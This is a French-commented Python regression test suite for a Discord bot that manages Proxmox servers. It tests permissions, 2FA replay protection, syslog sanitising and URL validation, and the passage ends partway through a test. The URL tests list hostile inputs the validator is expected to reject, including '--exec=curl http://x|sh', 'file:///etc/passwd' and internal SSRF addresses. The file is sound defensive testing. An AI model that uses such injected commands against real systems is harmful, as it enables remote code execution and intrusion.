"""Tests de non-régression du bot Edmine (stdlib `unittest`, zéro dépendance ajoutée).

    cd /opt/discord-bot && ./venv/bin/python -m unittest discover -s tests -v

POURQUOI CES TESTS-LÀ. L'audit du 2026-08-11 a montré que le projet n'avait aucun test
et que ses invariants critiques n'existaient qu'en prose dans les docstrings. On ne teste
donc pas « du code au hasard » : chaque test ci-dessous ancre un invariant dont la
violation a réellement coûté quelque chose, ou verrouille un correctif de cette campagne.

Le test le plus important du fichier est `TestToutesLesVuesSontGardees` : il échoue dès
qu'une NOUVELLE classe `discord.ui.View` est ajoutée sans passer par `GatedView`. C'est
lui qui empêche la classe de défauts « bouton sans porte » de se reformer.
"""
import os
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import discord  # noqa: E402

from bot.core import format as fmt  # noqa: E402
from bot.core.config import Config  # noqa: E402
from bot.core.gates import GatedView, VALID_GATES  # noqa: E402


# --------------------------------------------------------------------------- outils
class FauxRole:
    def __init__(self, rid):
        self.id = rid


class FauxGuild:
    def __init__(self, owner_id=1):
        self.owner_id = owner_id


class FauxUser:
    def __init__(self, uid, roles=()):
        self.id = uid
        self.roles = [FauxRole(r) for r in roles]


class FauxInteraction:
    """Le strict minimum que lisent permissions.is_admin / can_read / may_lock."""

    def __init__(self, uid=42, roles=(), guild_id=100, owner_id=1):
        self.user = FauxUser(uid, roles)
        self.guild = FauxGuild(owner_id)
        self.guild_id = guild_id


# --------------------------------------------------------------------------- config
class TestParsingConfig(unittest.TestCase):
    """`GESTION_SERVERS` décide qui pilote quel serveur : un parsing laxiste ou trop
    strict se traduit directement en droits accordés ou perdus."""

    def _cfg(self, **env):
        base = {"DISCORD_TOKEN": "x", "GUILD_ID": "100"}
        base.update(env)
        return Config(env=base)

    def test_trois_tiers(self):
        c = self._cfg(GESTION_SERVERS="R820:1:2:3")
        self.assertEqual(c.gestion_servers["R820"],
                         {"view": 1, "mod": 2, "owner": 3})

    def test_retrocompat_deux_ids(self):
        """Ancien format « clé:G:O » : le rôle de VUE ne doit JAMAIS donner Lock/nœud."""
        c = self._cfg(GESTION_SERVERS="R820:7:9")
        self.assertEqual(c.gestion_servers["R820"]["view"], 7)
        self.assertEqual(c.gestion_servers["R820"]["mod"], 9)
        self.assertEqual(c.gestion_servers["R820"]["owner"], 9)

    def test_entree_mal_formee_ignoree(self):
        """Une entrée cassée est REJETÉE, pas devinée — et n'emporte pas les autres."""
        c = self._cfg(GESTION_SERVERS="R820:1:2:3,CASSE:abc:def,AVY-PVE:4:5:6")
        self.assertIn("R820", c.gestion_servers)
        self.assertIn("AVY-PVE", c.gestion_servers)
        self.assertNotIn("CASSE", c.gestion_servers)

    def test_plusieurs_serveurs(self):
        c = self._cfg(GESTION_SERVERS="R820:1:2:3,AVY-PVE:4:5:6,SYNO:7:8:9")
        self.assertEqual(len(c.gestion_servers), 3)

    def test_node_server_key_retombe_sur_server_key(self):
        """Correctif 2026-08-11 : le repli était « première entrée de GESTION_SERVERS »,
        donc réordonner la variable changeait qui détient le shell root."""
        c = self._cfg(GESTION_SERVERS="AVY-PVE:4:5:6,R820:1:2:3", SERVER_KEY="R820")
        self.assertEqual(c.node_server_key, "R820")
        self.assertEqual(c.node_mod_role_id, 2)

    def test_csv_ints_tolere_espaces_et_vide(self):
        c = self._cfg(ADMIN_IDS=" 12, 34 ,, 56 ")
        self.assertEqual(c.admin_ids, [12, 34, 56])
        self.assertEqual(self._cfg(ADMIN_IDS="").admin_ids, [])

    def test_bool_formes_acceptees(self):
        for v in ("1", "true", "TRUE", "yes", "on"):
            self.assertTrue(self._cfg(TWOFA_ENABLED=v).twofa_enabled, v)
        for v in ("0", "false", "no", "off", ""):
            self.assertFalse(self._cfg(TWOFA_ENABLED=v).twofa_enabled, v)

    def test_ct_channels(self):
        c = self._cfg(CT_CHANNELS="jellyfin:123,web:456")
        self.assertEqual(c.ct_channels, {"jellyfin": 123, "web": 456})


# ---------------------------------------------------------------------- permissions
class TestIsAdminFailClosed(unittest.TestCase):
    """`is_admin(server=X)` retombait sur les rôles GLOBAUX quand X était inconnu :
    un porteur de « Gestion R820 » pouvait piloter une machine d'Aveyron."""

    def setUp(self):
        from bot.core import permissions
        self.perms = permissions
        self.cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "100",
                               "ADMIN_IDS": "999",
                               "ADMIN_ROLE_IDS": "500",
                               "GESTION_SERVERS": "R820:1:2:3,AVY-PVE:4:5:6"})

    def test_cle_connue_borne_aux_roles_de_ce_serveur(self):
        avy = FauxInteraction(uid=42, roles=(5,))       # M AVY-PVE
        self.assertTrue(self.perms.is_admin(self.cfg, avy, server="AVY-PVE"))
        r820 = FauxInteraction(uid=42, roles=(500,))    # Gestion R820 seulement
        self.assertFalse(self.perms.is_admin(self.cfg, r820, server="AVY-PVE"))

    def test_cle_INCONNUE_refuse(self):
        """Le cœur du correctif : nœud ajouté/renommé, ou entrée mal formée."""
        itx = FauxInteraction(uid=42, roles=(500,))     # Gestion R820
        self.assertFalse(self.perms.is_admin(self.cfg, itx, server="AVY-INCONNU"))

    def test_break_glass_survit_a_une_cle_inconnue(self):
        """Fail-closed ne doit JAMAIS verrouiller totalement : propriétaire + ADMIN_IDS."""
        proprio = FauxInteraction(uid=1, roles=(), owner_id=1)
        self.assertTrue(self.perms.is_admin(self.cfg, proprio, server="AVY-INCONNU"))
        admin = FauxInteraction(uid=999, roles=())
        self.assertTrue(self.perms.is_admin(self.cfg, admin, server="AVY-INCONNU"))

    def test_sans_serveur_utilise_les_roles_globaux(self):
        itx = FauxInteraction(uid=42, roles=(500,))
        self.assertTrue(self.perms.is_admin(self.cfg, itx))

    def test_can_read_fail_closed_si_aucun_role_lecture(self):
        cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "100"})
        self.assertFalse(self.perms.can_read(cfg, FauxInteraction(uid=42, roles=(7,))))


# ---------------------------------------------------------------------------- gates
class TestToutesLesVuesSontGardees(unittest.TestCase):
    """LE test anti-récidive de la campagne.

    L'audit a trouvé 12 vues sans aucune porte d'autorisation, parce que la protection
    reposait sur une convention. Ce test échoue dès qu'une `discord.ui.View` est ajoutée
    sans hériter de `GatedView` : oublier la porte redevient impossible.

    Si tu ajoutes une vue légitimement publique, hérite quand même de GatedView avec
    `gate = None` ET un `gate_reason` écrit — l'exemption devient une décision tracée.
    """

    EXEMPTES = {
        # vues internes de discord.py, hors de notre contrôle
        "MissingPage",
    }

    def _charger_tous_les_modules(self):
        import importlib
        import pkgutil
        import bot
        for mod in pkgutil.walk_packages(bot.__path__, prefix="bot."):
            try:
                importlib.import_module(mod.name)
            except Exception as e:  # noqa: BLE001
                self.fail(f"{mod.name} ne s'importe pas : {type(e).__name__}: {e}")

    def test_aucune_vue_sans_porte(self):
        self._charger_tous_les_modules()
        coupables = []
        for cls in _sous_classes(discord.ui.View):
            if cls is GatedView or issubclass(cls, GatedView):
                continue
            if cls.__name__ in self.EXEMPTES:
                continue
            if not cls.__module__.startswith("bot."):
                continue        # vues internes de la bibliothèque
            coupables.append(f"{cls.__module__}.{cls.__name__}")
        self.assertEqual(
            coupables, [],
            "Ces vues n'héritent pas de GatedView, donc leurs boutons ne sont gardés "
            "par RIEN (ni rôle, ni session 2FA) :\n  - " + "\n  - ".join(coupables))

    def test_gate_declaree_valide_partout(self):
        self._charger_tous_les_modules()
        for cls in _sous_classes(GatedView):
            # type.__new__ inscrit la classe dans __subclasses__ AVANT d'appeler
            # __init_subclass__ : les classes fautives de nos propres tests y restent.
            if not cls.__module__.startswith("bot."):
                continue
            self.assertIn(cls.gate, VALID_GATES,
                          f"{cls.__module__}.{cls.__name__}: gate={cls.gate!r} invalide")
            if cls.gate is None:
                self.assertTrue(
                    cls.gate_reason,
                    f"{cls.__module__}.{cls.__name__} désactive la porte sans "
                    "`gate_reason` : toute exemption doit être justifiée.")

    def test_gate_inconnue_refusee_a_la_declaration(self):
        with self.assertRaises(TypeError):
            class VueFautive(GatedView):
                gate = "administrateur"      # n'existe pas

    def test_exemption_sans_justification_refusee(self):
        with self.assertRaises(TypeError):
            class VueNue(GatedView):
                gate = None                  # sans gate_reason


def _sous_classes(racine):
    vues = set()
    pile = [racine]
    while pile:
        c = pile.pop()
        for s in c.__subclasses__():
            if s not in vues:
                vues.add(s)
                pile.append(s)
    return vues


# ----------------------------------------------------------------------------- 2FA
class TestAntiRejeuTOTP(unittest.TestCase):
    """`valid_window=1` rend trois codes valides à la fois (~90 s). Ne mémoriser que le
    DERNIER code laissait rejouer le précédent dès qu'un second était accepté."""

    def setUp(self):
        import tempfile
        import pyotp
        from bot.core.twofa import TwoFA
        self.pyotp = pyotp
        self.dir = tempfile.mkdtemp()
        self.tf = TwoFA(os.path.join(self.dir, "2fa.json"), session_min=15)
        self.secret, _ = self.tf.begin_enroll(7, "test")
        self.totp = pyotp.TOTP(self.secret)
        self.backup = self.tf.confirm_enroll(7, self.totp.now())
        self.assertIsNotNone(self.backup, "inscription 2FA impossible")

    def test_meme_code_refuse_deux_fois(self):
        # `confirm_enroll` a déjà consommé le pas courant : on prend le SUIVANT.
        code = self.totp.at(int(time.time()) + 30)
        self.assertTrue(self.tf.verify(7, code))
        self.assertFalse(self.tf.verify(7, code), "rejeu du MÊME code accepté")

    def test_code_precedent_refuse_apres_avancee(self):
        """Le vrai trou : A accepté, puis B accepté, puis A rejoué dans sa fenêtre."""
        # valid_window=1 => seuls les pas N-1, N et N+1 sont acceptés. On repart d'une
        # inscription faite sur N-1 pour garder N et N+1 disponibles.
        import tempfile
        from bot.core.twofa import TwoFA
        tf = TwoFA(os.path.join(tempfile.mkdtemp(), "2fa.json"), session_min=15)
        secret, _ = tf.begin_enroll(8, "test")
        totp = self.pyotp.TOTP(secret)
        maintenant = int(time.time())
        self.assertIsNotNone(tf.confirm_enroll(8, totp.at(maintenant - 30)))  # pas N-1
        code_a = totp.at(maintenant)                # pas N
        code_b = totp.at(maintenant + 30)           # pas N+1
        self.assertTrue(tf.verify(8, code_a))
        self.assertTrue(tf.verify(8, code_b))
        self.assertFalse(tf.verify(8, code_a),
                         "le code de la fenêtre précédente est encore rejouable")

    def test_code_de_secours_a_usage_unique(self):
        b = self.backup[0]
        self.assertTrue(self.tf.verify(7, b))
        self.assertFalse(self.tf.verify(7, b), "code de secours réutilisable")

    def test_session_ouverte_puis_fermee(self):
        self.assertTrue(self.tf.verify(7, self.totp.at(int(time.time()) + 30)))
        self.assertTrue(self.tf.trusted(7))
        self.tf.close_session(7)
        self.assertFalse(self.tf.trusted(7))

    def test_magasin_illisible_marque_degrade(self):
        """`degraded` gèle la réconciliation des rôles : sans lui, un fichier corrompu
        ferait conclure « personne n'est inscrit » et révoquerait Gestion/O à tous."""
        from bot.core.twofa import TwoFA
        p = os.path.join(self.dir, "casse.json")
        with open(p, "w") as f:
            f.write("{ceci n'est pas du json")
        self.assertTrue(TwoFA(p, session_min=15).degraded)

    def test_fichier_absent_nest_PAS_degrade(self):
        from bot.core.twofa import TwoFA
        tf = TwoFA(os.path.join(self.dir, "jamais-cree.json"), session_min=15)
        self.assertFalse(tf.degraded, "aucun inscrit = état normal, pas dégradé")

    # --- durée des sessions (2026-08-14) : heures et illimité -------------------
    def test_session_illimitee_survit_au_redemarrage(self):
        """0 minute = session SANS expiration, et la sentinelle doit traverser le fichier.

        Le piège que ce test verrouille : `_load_sessions` filtrait sur `exp > now`, ce
        qu'une expiration négative (NEVER) ne passe pas — un redémarrage aurait donc
        refermé précisément les sessions déclarées éternelles.
        """
        from bot.core.twofa import TwoFA
        self.tf.open_session(7, 0)
        self.assertTrue(self.tf.trusted(7))
        self.assertEqual(self.tf.session_left(7), -1, "-1 = illimité, distinct de 0")
        self.assertEqual(self.tf.expire_stale(), [], "une session illimitée n'expire pas")
        rechargee = TwoFA(os.path.join(self.dir, "2fa.json"), session_min=15)
        self.assertTrue(rechargee.trusted(7), "session illimitée perdue au redémarrage")

    def test_duree_choisie_a_l_ouverture_et_reglage_persiste(self):
        from bot.core.twofa import TwoFA
        self.tf.open_session(7, 120)                    # 2 h pour CETTE session
        self.assertGreater(self.tf.session_left(7), 110 * 60)
        self.tf.set_session_min(0)                      # réglage GLOBAL -> illimité
        self.assertGreater(self.tf.session_left(7), 0,
                           "changer le réglage ne doit pas toucher aux sessions ouvertes")
        rechargee = TwoFA(os.path.join(self.dir, "2fa.json"), session_min=15)
        self.assertEqual(rechargee.session_min, 0, "réglage /2fa duree non persisté")
        self.assertEqual(rechargee.default_session_min, 15,
                         "la valeur de config.env doit rester disponible en repli")

    def test_open_session_zero_nest_pas_confondu_avec_defaut(self):
        """`minutes or self.session_min` aurait fait de « illimité » un simple défaut."""
        self.tf.set_session_min(30)
        self.tf.open_session(7, 0)
        self.assertEqual(self.tf.session_left(7), -1)


class TestDurations(unittest.TestCase):
    """L'analyseur partagé par la modale du terminal et le 2FA (core/durations.py)."""

    def test_formes_acceptees(self):
        from bot.core.durations import parse_duration
        for brut, attendu in [("45", 45), ("45m", 45), ("45 min", 45), ("2h", 120),
                              ("1h30", 90), ("1 h 30", 90), ("0", 0), ("illimité", 0),
                              ("ILLIMITE", 0), ("∞", 0), ("indéfini", 0), ("jamais", 0)]:
            self.assertEqual(parse_duration(brut), attendu, brut)
        for brut in ("bonjour", "", "12x", "1h2h"):
            with self.assertRaises(ValueError, msg=brut):
                parse_duration(brut)

    def test_clamp_distingue_absence_de_choix_et_illimite(self):
        from bot.core.durations import clamp_duration
        self.assertEqual(clamp_duration(None, 10, 120), 10)   # rien saisi -> défaut
        self.assertEqual(clamp_duration(0, 10, 120), 120)     # illimité refusé -> plafond
        self.assertEqual(clamp_duration(0, 10, 0), 0)         # plafond levé -> illimité
        self.assertEqual(clamp_duration(999, 10, 120), 120)   # rabote, pas de refus
        self.assertEqual(clamp_duration(45, 10, 0), 45)       # sans plafond, valeur libre

    def test_rendu_francais(self):
        from bot.core.durations import fmt_duration
        self.assertEqual(fmt_duration(0), "illimité")
        self.assertEqual(fmt_duration(45), "45 min")
        self.assertEqual(fmt_duration(120), "2 h")
        self.assertEqual(fmt_duration(90), "1 h 30")


# -------------------------------------------------------------------------- syslog
class TestParsingSyslog(unittest.TestCase):
    """Le listener UDP accepte des paquets NON AUTHENTIFIÉS et les republie dans Discord :
    tout ce qui en sort doit être délinéarisé et borné."""

    def setUp(self):
        from bot.core import syslog_lib
        self.sl = syslog_lib

    def test_rfc3164(self):
        sev, host, app, txt = self.sl.parse_packet(
            b"<11>Aug 11 00:12:01 pve kernel: quelque chose", "10.3.10.200")
        self.assertEqual(sev, 3)
        self.assertEqual(host, "pve")
        self.assertIn("quelque chose", txt)

    def test_rfc5424(self):
        sev, host, app, txt = self.sl.parse_packet(
            b"<14>1 2026-08-11T00:12:01Z jellyfin sshd 1234 - - session ouverte",
            "10.3.10.105")
        self.assertEqual(sev, 6)
        self.assertEqual(host, "jellyfin")
        self.assertEqual(app, "sshd")

    def test_hostname_borne(self):
        long = "h" * 500
        _, host, _, _ = self.sl.parse_packet(
            f"<11>Aug 11 00:12:01 {long} app: x".encode(), "10.0.0.1")
        self.assertLessEqual(len(host), self.sl.MAX_HOST)

    def test_forge_de_lignes_impossible(self):
        """Un émetteur hostile ne doit pas pouvoir injecter des lignes Discord —
        ni par le corps, ni par le hostname, ni par le nom de programme."""
        forge = b"<11>1 2026-08-11T00:00:00Z ho\nst ap\np 1 - - corps\nligne2"
        sev, host, app, txt = self.sl.parse_packet(forge, "10.0.0.1")
        # 1) à la source : l'hôte et le programme ne portent plus de saut de ligne
        for champ, nom in ((host, "host"), (app, "app")):
            self.assertNotIn("\n", champ, f"saut de ligne conservé dans {nom}")
            self.assertNotIn("\r", champ, f"retour chariot conservé dans {nom}")
        # 2) au rendu : le corps garde ses sauts de ligne légitimes (une trace d'exception
        #    EST multi-ligne), c'est sanitize_field/sanitize_code qui protège l'en-tête
        self.assertNotIn("\n", self.sl.sanitize_field(host, self.sl.MAX_HOST))
        self.assertNotIn("\n", self.sl.sanitize_code(app, self.sl.MAX_APP))

    def test_paquet_vide_ne_leve_pas(self):
        self.assertIsNotNone(self.sl.parse_packet(b"", "10.0.0.1"))

    def test_agregateur_borne(self):
        """Sans plafond, un flux UDP soutenu épuise la RAM du conteneur."""
        agg = self.sl.Aggregator()
        maxi = getattr(self.sl, "MAX_GROUPS", 2000)
        for i in range(maxi + 200):
            agg.add(3, f"hote{i}", "app", f"message {i}")
        self.assertLessEqual(len(agg.groups), maxi)


# --------------------------------------------------------------------------- noms
class TestNomsDeSalons(unittest.TestCase):
    """`slug` et `strip_status_emoji` doivent être exactement réciproques : c'est ce qui
    évite qu'un salon soit recréé en double ou renommé en boucle."""

    def test_slug_stable(self):
        self.assertEqual(fmt.slug("Mon CT"), fmt.slug("Mon CT"))
        self.assertNotIn(" ", fmt.slug("mon ct"))

    def test_strip_status_emoji_reciproque(self):
        for base in ("jellyfin", "web-test", "authentik-avy"):
            for emoji in ("🟢", "🔴", "🟠"):
                self.assertEqual(fmt.strip_status_emoji(f"{emoji}-{base}"), base,
                                 f"{emoji}-{base}")

    def test_strip_sans_emoji_inchange(self):
        self.assertEqual(fmt.strip_status_emoji("jellyfin"), "jellyfin")

    def test_slug_idempotent(self):
        s = fmt.slug("Éléonore & Cie")
        self.assertEqual(fmt.slug(s), s, "slug non idempotent : renommages en boucle")


# ------------------------------------------------------------------------ youtube
class TestValidationURL(unittest.TestCase):
    """L'URL de `/yt` part vers yt-dlp sur le CT120, et `/yt` n'exige que le rôle de
    LECTURE. La validation d'entrée est de notre côté."""

    def setUp(self):
        from bot.cogs import youtube
        self.yt = youtube

    def test_urls_legitimes(self):
        for u in ("https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                  "https://youtu.be/dQw4w9WgXcQ",
                  "https://www.twitch.tv/videos/123456"):
            self.assertTrue(self.yt._valid_url(u), u)

    def test_schemas_refuses(self):
        for u in ("file:///etc/passwd", "ftp://x/y", "javascript:alert(1)",
                  "--exec=curl http://x|sh", "/etc/passwd"):
            self.assertFalse(self.yt._valid_url(u), u)

    def test_ssrf_interne_refuse(self):
        for u in ("http://10.3.10.200:8006/", "http://localhost/", "http://127.0.0.1/"):
            self.assertFalse(self.yt._valid_url(u), u)

    def test_domaine_ressemblant_refuse(self):
        """« youtube.com.pirate.tld » ne doit pas passer pour youtube.com."""
        for u in ("https://youtube.com.pirate.tld/x", "https://notyoutube.com/x",
                  "https://evil.tld/?x=youtube.com"):
            self.assertFalse(self.yt._valid_url(u), u)

    def test_sous_domaine_legitime_accepte(self):
        self.assertTrue(self.yt._valid_url("https://m.youtube.com/watch?v=abc"))

    def test_non_chaine(self):
        for u in (None, 123, [], {}):
            self.assertFalse(self.yt._valid_url(u))

    def test_intention_playlist(self):
        self.assertTrue(self.yt._playlist_intent(
            "https://www.youtube.com/playlist?list=PLabc"))
        self.assertTrue(self.yt._playlist_intent(
            "https://www.youtube.com/watch?v=x&list=PLabc"))
        self.assertFalse(self.yt._playlist_intent(
            "https://www.youtube.com/watch?v=x"))
        self.assertFalse(self.yt._playlist_intent("https://www.twitch.tv/videos/1"))


# --------------------------------------------------------------------------- influx
class TestInfluxEchecDifferentDeVide(unittest.TestCase):
    """Une requête en échec renvoyait `[]`, exactement comme « aucune donnée » :
    les alertes devenaient aveugles sans que rien ne le dise."""

    def test_expose_son_etat(self):
        from bot.core.influx import Influx
        cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "1"})
        inf = Influx(cfg)                      # sans jeton : désactivé
        self.assertTrue(hasattr(inf, "last_error"))
        self.assertIsNone(inf.last_error, "aucune requête tentée = aucune erreur")


# ------------------------------------------------------------ tâches de fond (bg)
class TestFiletDesBoucles(unittest.TestCase):
    """Une exception non rattrapée arrête une `tasks.loop` DÉFINITIVEMENT. Le filet doit
    exister, et `/health` doit pouvoir dire qu'une boucle est morte."""

    def test_registre_et_resume(self):
        from bot.core import bg
        saines, total, cassees = bg.loops_summary()
        self.assertIsInstance(total, int)
        self.assertIsInstance(cassees, list)
        self.assertEqual(saines, total - len(cassees))

    def test_guard_cog_loops_est_idempotent(self):
        from discord.ext import commands, tasks
        from bot.core import bg

        class FauxCog(commands.Cog):
            @tasks.loop(seconds=3600)
            async def ma_boucle(self):
                pass

        cog = FauxCog()
        n1 = bg.guard_cog_loops(cog)
        n2 = bg.guard_cog_loops(cog)
        self.assertEqual(n1, n2, "les mêmes boucles doivent être retrouvées")
        self.assertTrue(any("ma_boucle" in n for n in n1),
                        "la boucle du cog n'a pas été détectée")

    def test_backoff_ne_relance_pas_en_boucle_serree(self):
        """`restart()` est un no-op sur une tâche terminée : le module doit utiliser
        `start()`, et espacer les relances au lieu de marteler."""
        import inspect
        from bot.core import bg
        src = inspect.getsource(bg)
        self.assertIn("start()", src)
        self.assertNotIn("loop.restart()", src,
                         "restart() est un no-op après échec — utiliser start()")


# ------------------------------------------- coupe-circuit du cluster secondaire
class TestCoupeCircuitAveyron(unittest.TestCase):
    """2026-08-14 : 287 bascules « injoignable / de nouveau joignable » en une journée,
    tunnel WireGuard parfaitement sain (0 % de perte, 34 ms). Une SEULE lecture — le
    contenu du stockage de sauvegarde, dont le partage CIFS était démonté côté Aveyron —
    expirait à 30 s et faisait déclarer tout le cluster mort pendant 120 s."""

    def _pve(self):
        from bot.core.pve import Pve
        p = Pve.__new__(Pve)               # pas d'__init__ : aucun réseau, aucune conf
        p._avy = None                      # `avy_key` est une property : elle le lit
        p._avy_fail_ts = 0.0
        p._avy_ok_ts = 0.0                 # aucune preuve de vie récente du lien
        p._avy_warned = False
        return p

    def test_echec_isole_n_arme_pas_si_une_lecture_vient_de_reussir(self):
        """Un nœud malade (CIFS démonté sur `nas`) ne doit pas faire déclarer morts les
        deux autres, qui répondent en 0,13 s."""
        from bot.core.pve import AvyUnreachable
        p = self._pve()
        p._avy_read(lambda: "ms01 ok")      # preuve de vie du lien, à l'instant
        with self.assertRaises(AvyUnreachable):
            p._avy_read(lambda: (_ for _ in ()).throw(TimeoutError("nas muet")))
        self.assertEqual(p._avy_fail_ts, 0.0, "lien prouvé vivant : échec LOCAL au nœud")

    def test_arme_quand_plus_rien_ne_repond(self):
        """Vraie coupure : la fenêtre de preuve se vide, le coupe-circuit reprend son rôle."""
        from bot.core.pve import AVY_ALIVE_WINDOW, AvyUnreachable
        p = self._pve()
        p._avy_read(lambda: "ok")
        p._avy_ok_ts = time.time() - AVY_ALIVE_WINDOW - 1     # succès devenu trop vieux
        with self.assertRaises(AvyUnreachable):
            p._avy_read(lambda: (_ for _ in ()).throw(ConnectionError("lien coupé")))
        self.assertGreater(p._avy_fail_ts, 0.0)

    def test_lecture_lente_n_arme_pas_le_coupe_circuit(self):
        from bot.core.pve import AvyUnreachable
        p = self._pve()

        def expire():
            raise TimeoutError("Read timed out. (read timeout=30)")

        with self.assertRaises(AvyUnreachable):
            p._avy_soft_read(expire)
        self.assertEqual(p._avy_fail_ts, 0.0,
                         "un stockage mort n'est pas un cluster mort")
        # les autres lectures doivent continuer de passer
        self.assertEqual(p._avy_read(lambda: "ok"), "ok")

    def test_lecture_normale_arme_toujours(self):
        from bot.core.pve import AvyUnreachable
        p = self._pve()

        def coupe():
            raise ConnectionError("lien coupé")

        with self.assertRaises(AvyUnreachable):
            p._avy_read(coupe)
        self.assertGreater(p._avy_fail_ts, 0.0, "une vraie panne doit armer")
        with self.assertRaises(AvyUnreachable):
            p._avy_soft_read(lambda: "jamais appelé")   # court-circuitée aussi

    def test_sonde_arbitre_quand_la_recence_ne_suffit_pas(self):
        """Les boucles tournent toutes les 2-4 min : en début de cycle, le dernier succès
        a presque toujours plus de 60 s. Sans sonde, le coupe-circuit se ré-armait quand
        même — et restait ouvert en continu (mesuré le 14/08)."""
        from bot.core.pve import AVY_ALIVE_WINDOW, AvyUnreachable

        class FauxAvy:
            key = "AVEYRON"
            def __init__(self, vivant): self.vivant = vivant
            def alive(self): return self.vivant

        for vivant, arme in ((True, False), (False, True)):
            p = self._pve()
            p._avy = FauxAvy(vivant)
            p._avy_ok_ts = time.time() - AVY_ALIVE_WINDOW - 1   # récence épuisée
            with self.assertRaises(AvyUnreachable):
                p._avy_read(lambda: (_ for _ in ()).throw(TimeoutError("muet")))
            self.assertEqual(bool(p._avy_fail_ts), arme,
                             f"sonde vivante={vivant} -> armement attendu {arme}")

    def test_coupe_circuit_par_noeud(self):
        """Un nœud muet ne doit coûter son timeout qu'UNE fois, et ne pas contaminer
        ses voisins ni le cluster."""
        from bot.core.pve import AvyNodeUnreachable, AvyUnreachable, _RemoteCluster
        c = _RemoteCluster.__new__(_RemoteCluster)
        c.key, c._node_fail = "AVEYRON", {}

        def muet():
            raise TimeoutError("Read timed out. (read timeout=30)")

        with self.assertRaises(AvyNodeUnreachable):
            c._node_guard("nas", muet)
        self.assertIn("nas", c.degraded_nodes())
        appels = []
        with self.assertRaises(AvyNodeUnreachable):      # 2e appel : plus de timeout payé
            c._node_guard("nas", lambda: appels.append(1))
        self.assertEqual(appels, [], "le nœud muet doit être court-circuité")
        self.assertEqual(c._node_guard("ms01", lambda: "ok"), "ok",
                         "les voisins ne doivent pas être touchés")
        # non-OSError : c'est ce qui protège le coupe-circuit du CLUSTER
        self.assertTrue(issubclass(AvyNodeUnreachable, AvyUnreachable))
        self.assertFalse(issubclass(AvyNodeUnreachable, OSError))
        c._node_fail["nas"] = 0                          # fenêtre écoulée
        self.assertEqual(c._node_guard("nas", lambda: "revenu"), "revenu")
        self.assertEqual(c.degraded_nodes(), [])

    def test_any_node_prefere_le_noeud_local(self):
        """Viser un autre nœud fait passer l'appel par le tunnel inter-nœuds, qui ne rend
        pas l'erreur d'un stockage HS : il expire à ~30 s (596)."""
        from bot.core.pve import _RemoteCluster
        c = _RemoteCluster.__new__(_RemoteCluster)
        c.key = "AVEYRON"
        c._nodes_cache, c._nodes_ts = ["llm", "nas", "ms01"], time.time() + 10 ** 6
        c._local_cache, c._local_ts = "nas", time.time() + 10 ** 6
        self.assertEqual(c._any_node(), "nas")
        c._local_cache = ""                # nœud local indéterminé -> comportement d'avant
        self.assertEqual(c._any_node(), "llm")
        c._local_cache = "absent"          # nœud local hors ligne -> on ne l'impose pas
        self.assertEqual(c._any_node(), "llm")


# ------------------------------------------------- durée d'inactivité d'un terminal
class TestDureeInactiviteTerminal(unittest.TestCase):
    """La durée est saisie à l'ouverture (modale) : elle vient de l'utilisateur, donc
    elle doit être analysée strictement et BORNÉE — un shell root avec « 100000 min »
    d'inactivité serait un shell root permanent."""

    def test_parse(self):
        from bot.cogs.terminal import _parse_minutes
        for brut, attendu in (("45", 45), ("45m", 45), ("45 min", 45),
                              ("2h", 120), ("1h30", 90), (" 90 ", 90)):
            self.assertEqual(_parse_minutes(brut), attendu, brut)
        for brut in ("", "abc", "-5", "10 jours", "1h30m", "1e3"):
            with self.assertRaises(ValueError, msg=brut):
                _parse_minutes(brut)

    def test_plafond_jamais_sous_le_defaut(self):
        cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "1",
                          "TERMINAL_IDLE_MIN": "30", "TERMINAL_IDLE_MAX_MIN": "10"})
        self.assertEqual(cfg.terminal_idle_max_min, 30,
                         "un plafond sous le défaut refuserait le défaut lui-même")

    def test_plafond_noeud_borne_par_la_duree_de_vie(self):
        cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "1",
                          "NODE_TERMINAL_IDLE_MAX_MIN": "600",
                          "NODE_TERMINAL_MAX_MIN": "120"})
        self.assertEqual(cfg.node_terminal_idle_max_min, 120,
                         "promettre plus d'inactivité que la durée de vie absolue")

    def test_session_utilise_la_valeur_choisie(self):
        from bot.cogs.terminal import TerminalSession

        class FauxCog:
            cfg = Config(env={"DISCORD_TOKEN": "x", "GUILD_ID": "1"})

        sess = TerminalSession.__new__(TerminalSession)
        TerminalSession.__init__(sess, FauxCog(), None, 106, "ct", 1, None, idle_min=45)
        self.assertEqual(sess.idle_min, 45)

    def test_archivage_du_fil_couvre_la_session(self):
        """Le fil ne doit pas s'archiver sous une console encore vivante : Discord ne
        compte QUE les messages, or la console édite son écran sans jamais en envoyer."""
        from bot.cogs.terminal import auto_archive_for
        self.assertEqual(auto_archive_for(0), 10080, "vie illimitée -> palier maximum")
        self.assertEqual(auto_archive_for(None), 10080)
        self.assertEqual(auto_archive_for(120), 1440,
                         "2 h de vie sous un archivage à 60 min = fil archivé en séance")
        self.assertEqual(auto_archive_for(60), 60)
        self.assertEqual(auto_archive_for(99999), 10080)
        self.assertIn(auto_archive_for(2000), (60, 1440, 4320, 10080),
                      "Discord n'accepte QUE ces quatre paliers")


# ------------------------------------------------- ménage des salons d'invités
class TestMenageSalonsFantomes(unittest.IsolatedAsyncioTestCase):
    """`Provision._sweep_ghost_channels` SUPPRIME des salons Discord — c'est
    irréversible. Ces tests verrouillent ses quatre garde-fous, parce qu'une seule
    lecture PVE en échec suffirait sinon à vider toutes les catégories « Gestion »."""

    class FauxSalon:
        def __init__(self, nom, cid):
            self.name, self.id, self.supprime = nom, cid, False

        async def delete(self, reason=None):
            self.supprime = True

    class FauxCategorie:
        def __init__(self, salons):
            self.text_channels = salons

    class FauxAudit:
        def record(self, **kw):
            pass

    class FauxBot:
        def __init__(self):
            self.audit = TestMenageSalonsFantomes.FauxAudit()

    def _cog(self):
        from bot.cogs.provision import Provision
        cog = Provision.__new__(Provision)
        cog.bot = self.FauxBot()
        cog.prov = {"ct": {}, "archived": {}, "ghost_chan": {}}
        return cog

    async def _cycles(self, cog, cat, guests, n, avy=None):
        for _ in range(n):
            await cog._sweep_ghost_channels(None, guests, cat, avy or {})

    async def test_pve_muet_ne_supprime_rien(self):
